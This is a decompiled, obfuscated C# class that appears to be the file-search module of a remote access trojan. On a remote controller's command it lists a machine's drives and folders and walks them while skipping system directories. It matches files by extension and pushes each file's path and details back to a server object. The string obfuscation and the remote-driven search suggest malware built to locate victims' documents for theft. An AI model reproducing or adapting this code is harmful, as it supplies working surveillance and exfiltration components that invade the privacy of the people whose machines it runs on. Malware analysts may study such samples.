using System;
using System.Collections.Generic;
using System.IO;

namespace awdrgori;

internal class awdrgoriDRIVF
{
	public string awdrgorifilesLogs = awdrgoriCONF.awdrgorifilesLogs;

	public int awdrgorifIndx = 0;

	public bool awdrgorireaging = false;

	public awdrgoriMCDM iserver;

	public List<string> awdrgorifExts = new List<string>();

	public List<string> awdrgorinotFilders = new List<string>();

	public string awdrgorimainPath;

	public int awdrgorisIndx = 0;

	public List<string> awdrgorisFiles = new List<string>();

	public bool awdrgoriseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public awdrgoriDRIVF()
	{
		awdrgorinotFilders.Add("clients_data|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("program files|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("system volume information|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("$recycle.bin|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("msocache|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("recoveDSDF|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("documents and settings|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("windows|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("program files (x86)|awdrgori".Split(new char[1] { '|' })[0]);
		awdrgorinotFilders.Add("programdata|awdrgori".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> awdrgoriaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.awdrgoriautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (awdrgoriseeAccess(text) && !awdrgorinotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void awdrgorilookFiles(string tempStr)
	{
		iserver.awdrgoriautCnls = false;
		awdrgorifExts.Clear();
		awdrgorisFiles.Clear();
		awdrgorifIndx = 0;
		awdrgorisIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				awdrgorifExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			awdrgorireaging = true;
			awdrgorisendSearch(array[1]);
			awdrgorireaging = false;
			iserver.awdrgoripush_data(null, "awdrgori-seard=searched|awdrgori".Split(new char[1] { '|' })[0]);
		}
	}

	public string awdrgoricheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (awdrgoriseeAccess(text2))
				{
					text = text + text2 + ">|awdrgori".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}

	public void awdrgorisendSearch(string path)
	{
		try
		{
			foreach (string item in awdrgoriaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (awdrgorifExts.Contains(text.ToLower()))
				{
					string text2 = iserver.awdrgorifile_info(item, ret: true);
					iserver.awdrgoripush_data(null, "awdrgori-searf=|awdrgori".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|awdrgori".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.awdrgoriautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string awdrgorilookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|awdrgori".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public string awdrgorilookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|awdrgori".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
